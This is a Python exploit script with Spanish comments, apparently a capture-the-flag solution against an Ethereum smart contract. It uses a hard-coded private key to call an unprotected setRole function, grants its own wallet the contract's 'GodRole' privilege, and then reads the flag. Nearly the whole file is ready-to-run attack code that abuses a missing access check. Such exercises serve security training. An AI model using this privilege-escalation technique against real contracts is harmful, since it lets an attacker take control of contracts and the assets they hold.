#############################################################
#                                                           #
#   Nombre: exploit.py                                      #
#   Autor: focab0r                                          #
#   Descripcion: Interaccion con un contrato de blockchain  #
#                                                           #
#############################################################

from web3 import Web3
from eth_account import Account

# Direccion del contrato
contract_address = '0x217C12FBfE1B038f356EEAb86B2d36332F527702'

# Cargamos el ABI, necesario para interectuar con el contrato
contract_abi = [
			{
				"inputs": [],
				"stateMutability": "nonpayable",
				"type": "constructor"
			},
			{
				"inputs": [],
				"name": "getFlag",
				"outputs": [
					{
						"internalType": "string",
						"name": "",
						"type": "string"
					}
				],
				"stateMutability": "view",
				"type": "function"
			},
			{
				"inputs": [
					{
						"internalType": "address",
						"name": "user",
						"type": "address"
					}
				],
				"name": "getIdGodRole",
				"outputs": [
					{
						"internalType": "uint256",
						"name": "",
						"type": "uint256"
					}
				],
				"stateMutability": "view",
				"type": "function"
			},
			{
				"inputs": [
					{
						"internalType": "address",
						"name": "user",
						"type": "address"
					}
				],
				"name": "getRole",
				"outputs": [
					{
						"internalType": "uint256",
						"name": "",
						"type": "uint256"
					}
				],
				"stateMutability": "view",
				"type": "function"
			},
			{
				"inputs": [
					{
						"internalType": "address",
						"name": "",
						"type": "address"
					}
				],
				"name": "roles",
				"outputs": [
					{
						"internalType": "uint256",
						"name": "",
						"type": "uint256"
					}
				],
				"stateMutability": "view",
				"type": "function"
			},
			{
				"inputs": [
					{
						"internalType": "address",
						"name": "user",
						"type": "address"
					},
					{
						"internalType": "uint256",
						"name": "role",
						"type": "uint256"
					}
				],
				"name": "setRole",
				"outputs": [],
				"stateMutability": "nonpayable",
				"type": "function"
			},
			{
				"inputs": [
					{
						"internalType": "address",
						"name": "stringResponseAddress_",
						"type": "address"
					}
				],
				"name": "setStringResponseAddress",
				"outputs": [],
				"stateMutability": "nonpayable",
				"type": "function"
			}
		]


##### CONFIGURACION #####

web3 = Web3(Web3.HTTPProvider('http://IP:PORT')) # Conexion al servidor donde se encuentra el contrato

contract = web3.eth.contract(address=contract_address, abi=contract_abi) # Inicio de un nuevo objeto

private_key = '0x6a18fad22809ea0188c6b3ec6e5effcb48328b17ba77d2fb6ba550f803a70a84' # Llave privada de una de las carteras

account = Account.from_key(private_key) # Obtencion de la cartera a partir de la llave privada
user_address = account.address          # Guaramos la direccion de cartra en la variable user_adress


##### EXPLOIT #####

# Obtener el rol e imprimirlo
role = contract.functions.getRole(user_address).call()
print(f'The role of {user_address} is {role}.')

# Cambiar el rol a 3
nonce = web3.eth.get_transaction_count(account.address)
tx = contract.functions.setRole(user_address,3).build_transaction({
    'gas': 2000000,
    'gasPrice': web3.to_wei('10', 'gwei'),
    'nonce': nonce
})

signed_tx = web3.eth.account.sign_transaction(tx, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

# Imprimir el nuevo rol
role = contract.functions.getRole(user_address).call()
print(f'The new role of {user_address} is {role}.')

# Imprimir el GodRole
godRole = contract.functions.getIdGodRole(user_address).call()
print(f'GodRole is {godRole}')

# Cambiar el rol a GodRole
nonce = web3.eth.get_transaction_count(account.address)
tx = contract.functions.setRole(user_address,godRole).build_transaction({
    'gas':2000000,
    'gasPrice':web3.to_wei('10','gwei'),
    'nonce': nonce
})

signed_tx = web3.eth.account.sign_transaction(tx, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

# Imprimir el nuevo rol
role = contract.functions.getRole(user_address).call()
print(f'Role is {role}')

# Imprimir la flag
flag = contract.functions.getFlag().call({'from': user_address})
print(f'Flag: {flag}')

